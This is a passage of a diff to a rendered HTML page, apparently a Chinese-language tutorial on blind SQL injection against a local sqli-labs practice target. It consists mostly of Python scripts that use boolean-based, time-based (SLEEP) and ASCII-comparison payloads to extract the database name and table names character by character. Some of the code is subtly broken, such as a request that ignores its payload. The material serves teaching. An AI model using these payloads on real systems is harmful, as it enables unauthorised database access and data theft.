+</span><span id="__span-39-17"><a id="__codelineno-39-17" name="__codelineno-39-17"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE_MARK</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="nb">text</span>
+</span><span id="__span-39-18"><a id="__codelineno-39-18" name="__codelineno-39-18"></a>
+</span><span id="__span-39-19"><a id="__codelineno-39-19" name="__codelineno-39-19"></a><span class="o">#</span><span class="w"> </span><span class="err">猜测数据库名长度</span>
+</span><span id="__span-39-20"><a id="__codelineno-39-20" name="__codelineno-39-20"></a><span class="n">def</span><span class="w"> </span><span class="n">get_database_length</span><span class="p">():</span>
+</span><span id="__span-39-21"><a id="__codelineno-39-21" name="__codelineno-39-21"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">):</span>
+</span><span id="__span-39-22"><a id="__codelineno-39-22" name="__codelineno-39-22"></a><span class="w">        </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="ss">&quot;LENGTH(DATABASE())={i}&quot;</span>
+</span><span id="__span-39-23"><a id="__codelineno-39-23" name="__codelineno-39-23"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-39-24"><a id="__codelineno-39-24" name="__codelineno-39-24"></a><span class="w">            </span><span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="ss">&quot;[+] Database name length: {i}&quot;</span><span class="p">)</span>
+</span><span id="__span-39-25"><a id="__codelineno-39-25" name="__codelineno-39-25"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">i</span>
+</span><span id="__span-39-26"><a id="__codelineno-39-26" name="__codelineno-39-26"></a><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="ss">&quot;[-] Failed to determine database length&quot;</span><span class="p">)</span>
+</span><span id="__span-39-27"><a id="__codelineno-39-27" name="__codelineno-39-27"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span>
+</span><span id="__span-39-28"><a id="__codelineno-39-28" name="__codelineno-39-28"></a>
+</span><span id="__span-39-29"><a id="__codelineno-39-29" name="__codelineno-39-29"></a><span class="o">#</span><span class="w"> </span><span class="err">猜测数据库名内容</span>
+</span><span id="__span-39-30"><a id="__codelineno-39-30" name="__codelineno-39-30"></a><span class="n">def</span><span class="w"> </span><span class="n">get_database_name</span><span class="p">(</span><span class="k">length</span><span class="p">):</span>
+</span><span id="__span-39-31"><a id="__codelineno-39-31" name="__codelineno-39-31"></a><span class="w">    </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+</span><span id="__span-39-32"><a id="__codelineno-39-32" name="__codelineno-39-32"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="k">length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">):</span>
+</span><span id="__span-39-33"><a id="__codelineno-39-33" name="__codelineno-39-33"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">CHARSET</span><span class="p">:</span>
+</span><span id="__span-39-34"><a id="__codelineno-39-34" name="__codelineno-39-34"></a><span class="w">            </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="ss">&quot;SUBSTR(DATABASE(),{pos},1)=&#39;{ch}&#39;&quot;</span>
+</span><span id="__span-39-35"><a id="__codelineno-39-35" name="__codelineno-39-35"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-39-36"><a id="__codelineno-39-36" name="__codelineno-39-36"></a><span class="w">                </span><span class="n">name</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">ch</span>
+</span><span id="__span-39-37"><a id="__codelineno-39-37" name="__codelineno-39-37"></a><span class="w">                </span><span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="ss">&quot;[+] Found char {pos}: {ch} -&gt; {name}&quot;</span><span class="p">)</span>
+</span><span id="__span-39-38"><a id="__codelineno-39-38" name="__codelineno-39-38"></a><span class="w">                </span><span class="n">break</span>
+</span><span id="__span-39-39"><a id="__codelineno-39-39" name="__codelineno-39-39"></a><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="ss">&quot;[✓] Database name: {name}&quot;</span><span class="p">)</span>
+</span><span id="__span-39-40"><a id="__codelineno-39-40" name="__codelineno-39-40"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">name</span>
+</span><span id="__span-39-41"><a id="__codelineno-39-41" name="__codelineno-39-41"></a>
+</span><span id="__span-39-42"><a id="__codelineno-39-42" name="__codelineno-39-42"></a><span class="o">#</span><span class="w"> </span><span class="err">主函数</span>
+</span><span id="__span-39-43"><a id="__codelineno-39-43" name="__codelineno-39-43"></a><span class="k">if</span><span class="w"> </span><span class="n">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span id="__span-39-44"><a id="__codelineno-39-44" name="__codelineno-39-44"></a><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="ss">&quot;🔍 Boolean-based blind SQLi demo&quot;</span><span class="p">)</span>
+</span><span id="__span-39-45"><a id="__codelineno-39-45" name="__codelineno-39-45"></a><span class="w">    </span><span class="n">db_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_database_length</span><span class="p">()</span>
+</span><span id="__span-39-46"><a id="__codelineno-39-46" name="__codelineno-39-46"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">db_len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-39-47"><a id="__codelineno-39-47" name="__codelineno-39-47"></a><span class="w">        </span><span class="n">get_database_name</span><span class="p">(</span><span class="n">db_len</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-40-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-40-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-40-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-40-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-40-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-40-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-40-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-40-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-40-10">10</a></span>
+<span class="normal"><a href="#__codelineno-40-11">11</a></span>
+<span class="normal"><a href="#__codelineno-40-12">12</a></span>
+<span class="normal"><a href="#__codelineno-40-13">13</a></span>
+<span class="normal"><a href="#__codelineno-40-14">14</a></span>
+<span class="normal"><a href="#__codelineno-40-15">15</a></span>
+<span class="normal"><a href="#__codelineno-40-16">16</a></span>
+<span class="normal"><a href="#__codelineno-40-17">17</a></span>
+<span class="normal"><a href="#__codelineno-40-18">18</a></span>
+<span class="normal"><a href="#__codelineno-40-19">19</a></span>
+<span class="normal"><a href="#__codelineno-40-20">20</a></span>
+<span class="normal"><a href="#__codelineno-40-21">21</a></span>
+<span class="normal"><a href="#__codelineno-40-22">22</a></span>
+<span class="normal"><a href="#__codelineno-40-23">23</a></span>
+<span class="normal"><a href="#__codelineno-40-24">24</a></span>
+<span class="normal"><a href="#__codelineno-40-25">25</a></span>
+<span class="normal"><a href="#__codelineno-40-26">26</a></span>
+<span class="normal"><a href="#__codelineno-40-27">27</a></span>
+<span class="normal"><a href="#__codelineno-40-28">28</a></span>
+<span class="normal"><a href="#__codelineno-40-29">29</a></span>
+<span class="normal"><a href="#__codelineno-40-30">30</a></span>
+<span class="normal"><a href="#__codelineno-40-31">31</a></span>
+<span class="normal"><a href="#__codelineno-40-32">32</a></span>
+<span class="normal"><a href="#__codelineno-40-33">33</a></span>
+<span class="normal"><a href="#__codelineno-40-34">34</a></span>
+<span class="normal"><a href="#__codelineno-40-35">35</a></span>
+<span class="normal"><a href="#__codelineno-40-36">36</a></span>
+<span class="normal"><a href="#__codelineno-40-37">37</a></span>
+<span class="normal"><a href="#__codelineno-40-38">38</a></span>
+<span class="normal"><a href="#__codelineno-40-39">39</a></span>
+<span class="normal"><a href="#__codelineno-40-40">40</a></span>
+<span class="normal"><a href="#__codelineno-40-41">41</a></span>
+<span class="normal"><a href="#__codelineno-40-42">42</a></span>
+<span class="normal"><a href="#__codelineno-40-43">43</a></span>
+<span class="normal"><a href="#__codelineno-40-44">44</a></span>
+<span class="normal"><a href="#__codelineno-40-45">45</a></span>
+<span class="normal"><a href="#__codelineno-40-46">46</a></span>
+<span class="normal"><a href="#__codelineno-40-47">47</a></span>
+<span class="normal"><a href="#__codelineno-40-48">48</a></span>
+<span class="normal"><a href="#__codelineno-40-49">49</a></span>
+<span class="normal"><a href="#__codelineno-40-50">50</a></span>
+<span class="normal"><a href="#__codelineno-40-51">51</a></span>
+<span class="normal"><a href="#__codelineno-40-52">52</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1"></a><span class="c1"># 时间盲注</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4"></a>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5"></a><span class="c1"># ========================</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6"></a><span class="c1"># 配置区</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7"></a><span class="c1"># ========================</span>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8"></a><span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:9999/Less-1/index.php&quot;</span>
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9"></a><span class="n">DELAY_THRESHOLD</span> <span class="o">=</span> <span class="mi">2</span>         <span class="c1"># 响应延迟阈值（秒）</span>
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10"></a><span class="n">SLEEP_TIME</span> <span class="o">=</span> <span class="mi">3</span>              <span class="c1"># sleep 延迟时间（秒）</span>
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11"></a><span class="n">CHARSET</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span>
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12"></a><span class="n">MAX_DB_LENGTH</span> <span class="o">=</span> <span class="mi">20</span>          <span class="c1"># 最大尝试数据库长度</span>
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13"></a><span class="c1"># ========================</span>
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14"></a>
+</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15"></a><span class="c1"># 统一的时间测量函数</span>
+</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16"></a><span class="k">def</span><span class="w"> </span><span class="nf">is_delay</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-40-17"><a id="__codelineno-40-17" name="__codelineno-40-17"></a>    <span class="n">full_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">?id=1&#39; AND </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">--+&quot;</span>
+</span><span id="__span-40-18"><a id="__codelineno-40-18" name="__codelineno-40-18"></a>    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span><span id="__span-40-19"><a id="__codelineno-40-19" name="__codelineno-40-19"></a>    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">full_url</span><span class="p">)</span>
+</span><span id="__span-40-20"><a id="__codelineno-40-20" name="__codelineno-40-20"></a>    <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span><span id="__span-40-21"><a id="__codelineno-40-21" name="__codelineno-40-21"></a>    <span class="k">return</span> <span class="p">(</span><span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">DELAY_THRESHOLD</span>
+</span><span id="__span-40-22"><a id="__codelineno-40-22" name="__codelineno-40-22"></a>
+</span><span id="__span-40-23"><a id="__codelineno-40-23" name="__codelineno-40-23"></a><span class="c1"># 猜测数据库名长度</span>
+</span><span id="__span-40-24"><a id="__codelineno-40-24" name="__codelineno-40-24"></a><span class="k">def</span><span class="w"> </span><span class="nf">get_database_length</span><span class="p">():</span>
+</span><span id="__span-40-25"><a id="__codelineno-40-25" name="__codelineno-40-25"></a>    <span class="k">for</span> <span class="n">length</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">MAX_DB_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span><span id="__span-40-26"><a id="__codelineno-40-26" name="__codelineno-40-26"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;IF(LENGTH(DATABASE())=</span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, SLEEP(</span><span class="si">{</span><span class="n">SLEEP_TIME</span><span class="si">}</span><span class="s2">), 0)&quot;</span>
+</span><span id="__span-40-27"><a id="__codelineno-40-27" name="__codelineno-40-27"></a>        <span class="k">if</span> <span class="n">is_delay</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-40-28"><a id="__codelineno-40-28" name="__codelineno-40-28"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Database name length: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-40-29"><a id="__codelineno-40-29" name="__codelineno-40-29"></a>            <span class="k">return</span> <span class="n">length</span>
+</span><span id="__span-40-30"><a id="__codelineno-40-30" name="__codelineno-40-30"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Failed to determine length&quot;</span><span class="p">)</span>
+</span><span id="__span-40-31"><a id="__codelineno-40-31" name="__codelineno-40-31"></a>    <span class="k">return</span> <span class="mi">0</span>
+</span><span id="__span-40-32"><a id="__codelineno-40-32" name="__codelineno-40-32"></a>
+</span><span id="__span-40-33"><a id="__codelineno-40-33" name="__codelineno-40-33"></a><span class="c1"># 爆破数据库名</span>
+</span><span id="__span-40-34"><a id="__codelineno-40-34" name="__codelineno-40-34"></a><span class="k">def</span><span class="w"> </span><span class="nf">get_database_name</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+</span><span id="__span-40-35"><a id="__codelineno-40-35" name="__codelineno-40-35"></a>    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span><span id="__span-40-36"><a id="__codelineno-40-36" name="__codelineno-40-36"></a>    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span><span id="__span-40-37"><a id="__codelineno-40-37" name="__codelineno-40-37"></a>        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
+</span><span id="__span-40-38"><a id="__codelineno-40-38" name="__codelineno-40-38"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;IF(SUBSTR(DATABASE(), </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">, 1)=&#39;</span><span class="si">{</span><span class="n">ch</span><span class="si">}</span><span class="s2">&#39;, SLEEP(</span><span class="si">{</span><span class="n">SLEEP_TIME</span><span class="si">}</span><span class="s2">), 0)&quot;</span>
+</span><span id="__span-40-39"><a id="__codelineno-40-39" name="__codelineno-40-39"></a>            <span class="k">if</span> <span class="n">is_delay</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-40-40"><a id="__codelineno-40-40" name="__codelineno-40-40"></a>                <span class="n">name</span> <span class="o">+=</span> <span class="n">ch</span>
+</span><span id="__span-40-41"><a id="__codelineno-40-41" name="__codelineno-40-41"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Found char </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">ch</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-40-42"><a id="__codelineno-40-42" name="__codelineno-40-42"></a>                <span class="k">break</span>
+</span><span id="__span-40-43"><a id="__codelineno-40-43" name="__codelineno-40-43"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✓] Database name: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-40-44"><a id="__codelineno-40-44" name="__codelineno-40-44"></a>    <span class="k">return</span> <span class="n">name</span>
+</span><span id="__span-40-45"><a id="__codelineno-40-45" name="__codelineno-40-45"></a>
+</span><span id="__span-40-46"><a id="__codelineno-40-46" name="__codelineno-40-46"></a><span class="c1"># 主函数</span>
+</span><span id="__span-40-47"><a id="__codelineno-40-47" name="__codelineno-40-47"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span id="__span-40-48"><a id="__codelineno-40-48" name="__codelineno-40-48"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;🔍 Getting database name length...&quot;</span><span class="p">)</span>
+</span><span id="__span-40-49"><a id="__codelineno-40-49" name="__codelineno-40-49"></a>    <span class="n">db_len</span> <span class="o">=</span> <span class="n">get_database_length</span><span class="p">()</span>
+</span><span id="__span-40-50"><a id="__codelineno-40-50" name="__codelineno-40-50"></a>    <span class="k">if</span> <span class="n">db_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-40-51"><a id="__codelineno-40-51" name="__codelineno-40-51"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;🔍 Getting database name content...&quot;</span><span class="p">)</span>
+</span><span id="__span-40-52"><a id="__codelineno-40-52" name="__codelineno-40-52"></a>        <span class="n">get_database_name</span><span class="p">(</span><span class="n">db_len</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <p>通过ascii查找</p>
-<pre><code class="language-python">import requests
-
-# 配置
-url = &quot;http://127.0.0.1:9999/Less-1/?id=&quot;
-success_mark = &quot;You are in&quot;
-
-# ========== 通用函数 ==========
-def is_true(payload):
-    &quot;&quot;&quot;判断注入是否成功&quot;&quot;&quot;
-    payload_url = url + payload
-    r = requests.get(url)
-    return success_mark in r.text
-
-def ascii_range():
-    &quot;&quot;&quot;限制可爆破字符范围&quot;&quot;&quot;
-    return range(32, 128)  # 可打印字符
-
-# ========== 功能 1：爆破 database() ==========
-def leak_database_name():
-    name = &quot;&quot;
-    print(&quot;[*] Start leaking database() name...&quot;)
-    for pos in range(1, 20):
-        for asc in ascii_range():
-            payload = &quot;0'/**/or/**/(ascii(substr(database(),{pos},1))={asc})^0;#&quot;.format(pos=pos, asc=asc)
-            if is_true(payload):
-                name += chr(asc)
-                print(f&quot;[+] {pos}: {chr(asc)} → {name}&quot;)
-                break
-        else:
-            break  # 没有新字符则认为结束
-    print(f&quot;[✓] Database name: {name}&quot;)
-    return name
-
-# ========== 功能 2：爆破表名（可选） ==========
-def leak_table_names():
-    name = &quot;&quot;
-    print(&quot;[*] Start leaking table names...&quot;)
-    for pos in range(1, 100):
-        for asc in ascii_range():
-            payload = &quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{pos},1))={asc})&quot;.format(pos=pos, asc=asc)
-            if is_true(payload, post_key=&quot;id&quot;):
-                name += chr(asc)
-                print(f&quot;[+] {pos}: {chr(asc)} → {name}&quot;)
-                break
-        else:
-            break
-    print(f&quot;[✓] Table names: {name}&quot;)
-    return name
-
-# ========== 爆破列名、数据内容省略 ==========
-    # ========== 主入口 ==========
-if __name__ == &quot;__main__&quot;:
-    leak_database_name()
-    # leak_table_names()
-</code></pre>
-<h4 id="5">5. 二次注入</h4>
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-41-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-41-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-41-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-41-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-41-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-41-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-41-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-41-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-41-10">10</a></span>
+<span class="normal"><a href="#__codelineno-41-11">11</a></span>
+<span class="normal"><a href="#__codelineno-41-12">12</a></span>
+<span class="normal"><a href="#__codelineno-41-13">13</a></span>
+<span class="normal"><a href="#__codelineno-41-14">14</a></span>
+<span class="normal"><a href="#__codelineno-41-15">15</a></span>
+<span class="normal"><a href="#__codelineno-41-16">16</a></span>
+<span class="normal"><a href="#__codelineno-41-17">17</a></span>
+<span class="normal"><a href="#__codelineno-41-18">18</a></span>
+<span class="normal"><a href="#__codelineno-41-19">19</a></span>
+<span class="normal"><a href="#__codelineno-41-20">20</a></span>
+<span class="normal"><a href="#__codelineno-41-21">21</a></span>
+<span class="normal"><a href="#__codelineno-41-22">22</a></span>
+<span class="normal"><a href="#__codelineno-41-23">23</a></span>
+<span class="normal"><a href="#__codelineno-41-24">24</a></span>
+<span class="normal"><a href="#__codelineno-41-25">25</a></span>
+<span class="normal"><a href="#__codelineno-41-26">26</a></span>
+<span class="normal"><a href="#__codelineno-41-27">27</a></span>
+<span class="normal"><a href="#__codelineno-41-28">28</a></span>
+<span class="normal"><a href="#__codelineno-41-29">29</a></span>
+<span class="normal"><a href="#__codelineno-41-30">30</a></span>
+<span class="normal"><a href="#__codelineno-41-31">31</a></span>
+<span class="normal"><a href="#__codelineno-41-32">32</a></span>
+<span class="normal"><a href="#__codelineno-41-33">33</a></span>
+<span class="normal"><a href="#__codelineno-41-34">34</a></span>
+<span class="normal"><a href="#__codelineno-41-35">35</a></span>
+<span class="normal"><a href="#__codelineno-41-36">36</a></span>
+<span class="normal"><a href="#__codelineno-41-37">37</a></span>
+<span class="normal"><a href="#__codelineno-41-38">38</a></span>
+<span class="normal"><a href="#__codelineno-41-39">39</a></span>
+<span class="normal"><a href="#__codelineno-41-40">40</a></span>
+<span class="normal"><a href="#__codelineno-41-41">41</a></span>
+<span class="normal"><a href="#__codelineno-41-42">42</a></span>
+<span class="normal"><a href="#__codelineno-41-43">43</a></span>
+<span class="normal"><a href="#__codelineno-41-44">44</a></span>
+<span class="normal"><a href="#__codelineno-41-45">45</a></span>
+<span class="normal"><a href="#__codelineno-41-46">46</a></span>
+<span class="normal"><a href="#__codelineno-41-47">47</a></span>
+<span class="normal"><a href="#__codelineno-41-48">48</a></span>
+<span class="normal"><a href="#__codelineno-41-49">49</a></span>
+<span class="normal"><a href="#__codelineno-41-50">50</a></span>
+<span class="normal"><a href="#__codelineno-41-51">51</a></span>
+<span class="normal"><a href="#__codelineno-41-52">52</a></span>
+<span class="normal"><a href="#__codelineno-41-53">53</a></span>
+<span class="normal"><a href="#__codelineno-41-54">54</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2"></a>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3"></a><span class="c1"># 配置</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:9999/Less-1/?id=&quot;</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5"></a><span class="n">success_mark</span> <span class="o">=</span> <span class="s2">&quot;You are in&quot;</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6"></a>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7"></a><span class="c1"># ========== 通用函数 ==========</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;判断注入是否成功&quot;&quot;&quot;</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10"></a>    <span class="n">payload_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">payload</span>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12"></a>    <span class="k">return</span> <span class="n">success_mark</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13"></a>
+</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14"></a><span class="k">def</span><span class="w"> </span><span class="nf">ascii_range</span><span class="p">():</span>
+</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;限制可爆破字符范围&quot;&quot;&quot;</span>
+</span><span id="__span-41-16"><a id="__codelineno-41-16" name="__codelineno-41-16"></a>    <span class="k">return</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span>  <span class="c1"># 可打印字符</span>
+</span><span id="__span-41-17"><a id="__codelineno-41-17" name="__codelineno-41-17"></a>
+</span><span id="__span-41-18"><a id="__codelineno-41-18" name="__codelineno-41-18"></a><span class="c1"># ========== 功能 1：爆破 database() ==========</span>
+</span><span id="__span-41-19"><a id="__codelineno-41-19" name="__codelineno-41-19"></a><span class="k">def</span><span class="w"> </span><span class="nf">leak_database_name</span><span class="p">():</span>
+</span><span id="__span-41-20"><a id="__codelineno-41-20" name="__codelineno-41-20"></a>    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</span><span id="__span-41-21"><a id="__codelineno-41-21" name="__codelineno-41-21"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Start leaking database() name...&quot;</span><span class="p">)</span>
+</span><span id="__span-41-22"><a id="__codelineno-41-22" name="__codelineno-41-22"></a>    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-41-23"><a id="__codelineno-41-23" name="__codelineno-41-23"></a>        <span class="k">for</span> <span class="n">asc</span> <span class="ow">in</span> <span class="n">ascii_range</span><span class="p">():</span>
+</span><span id="__span-41-24"><a id="__codelineno-41-24" name="__codelineno-41-24"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;0&#39;/**/or/**/(ascii(substr(database(),</span><span class="si">{pos}</span><span class="s2">,1))=</span><span class="si">{asc}</span><span class="s2">)^0;#&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">asc</span><span class="o">=</span><span class="n">asc</span><span class="p">)</span>
